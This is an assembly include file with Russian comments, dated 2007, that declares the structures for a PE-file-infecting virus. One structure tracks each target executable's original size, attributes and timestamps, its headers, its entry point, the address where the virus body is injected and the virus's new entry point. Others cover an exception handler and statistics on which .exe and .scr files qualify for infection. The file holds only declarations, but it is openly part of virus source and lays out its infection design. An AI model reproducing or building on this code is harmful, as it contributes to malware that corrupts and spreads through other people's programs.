; ============================================================================
;	structures.inc
;
;	объявление структур
; 	last change :: 28.10.2007
; ============================================================================



; ============================================================================
;	структура, которую таскаем за собой при анализе и заражении файла 
;	для хранения необходимой информации
pe_file struct
	file_name			DD						?				; указатель на полный путь и имя обрабатываемого файла
	file_handle			DD						?				; хэндл открытого файла

	file_size			DD						?				; исходный размер файла
	new_file_size		DD						?				; размер заражённого файла

	file_attr			DD						?				; исходные аттрибуты заражаемого файла

	file_time_cr		FILETIME				<>				; | 
	file_time_la		FILETIME				<>				; | исходное время файла
	file_time_lw		FILETIME				<>				; |

	dos_h				IMAGE_DOS_HEADER		<>				; структура для считывания дос-заголовка
	signature			DD						?				; двойное слово для считывания сигнатуры
	file_h				IMAGE_FILE_HEADER		<>				; структура для считывания файлового заголовка
	opt_h				IMAGE_OPTIONAL_HEADER	<>				; структура для считывания опционального заголовка
	sec_h_last			IMAGE_SECTION_HEADER	<>				; структура для считывания информации о физически и виртуально последней секции
	sec_h_ep			IMAGE_SECTION_HEADER	<>				; структура для считывания информации о секции, содержащей точку входа

	p_opt_h				DD						?				; файловое смещение опционального заголовка
	p_sec_h_last		DD						?				; файловое смещение заголовка последней секции
	p_sec_h_ep			DD						?				; файловое смещение заголовка секции, содержащей точку входа

	p_ep				DD						?				; файловое смещение оригинальной точки входа

	p_injection_addr	DD						?				; адрес, куда надо дописать тело виря

	virus_ep			DD						?				; VA точки входа в секцию виря

	local_copy			DD						?				; адрес стековой копии вируса

IF	STAT	
	log_file_handle		DD						?				; 
ENDIF	
pe_file ends
; ============================================================================





; ============================================================================
;	структура обработчика исключений
;	
SEH struct
	PrevLink 		dd ?    ; the address of the previous seh structure
	CurrentHandler 	dd ?    ; the address of the exception handler
	SafeOffset 		dd ?    ; The offset where it's safe to continue execution
	PrevEsp 		dd ?    ; the old value in esp
	PrevEbp 		dd ?    ; The old value in ebp
SEH ends
; ============================================================================





; ============================================================================
;	структура для сбора статистики о текущем запуске
;	
IF STAT
statictic struct
	overlay					DD	?	; количество файлов, откинутых по наличию оверлея
	small_size				DD	?	; количество файлов, откинутых по слишком маленькому размеру
	large_size				DD	?	; количество файлов, откинутых по слишком большому размеру
	null_last_section		DD	?	; количество файлов, откинутых по нулевой последней секции
	cheksum_not_null		DD	?	; количество файлов, откинутых по ненулевой чексумме
	open_errors				DD	?	; количество файлов, которые не удалось открыть на запись/чтение
	ep_not_found			DD	?	; количество файлов, в которых не удалось найти ЕР
	x64						DD	?	; количество 64-разрядных файлов
	not_pe					DD	?	; расширение ехе или scr, но не РЕ-файл	
	total_to_infect			DD	?	; общее количество файлов, пригодных для заражения
	total					DD	?	; общее количество просмотренных файлов
	
	h_overlay				DD	?
	h_small_size			DD	?
	h_large_size			DD	?
	h_null_last_section		DD	?
	h_cheksum_not_null		DD	?
	h_open_errors			DD	?
	h_ep_not_found			DD	?
	h_x64					DD	?
	h_not_pe				DD	?
	h_total_to_infect		DD	?
	h_total					DD	?
statictic ends
ENDIF
; ============================================================================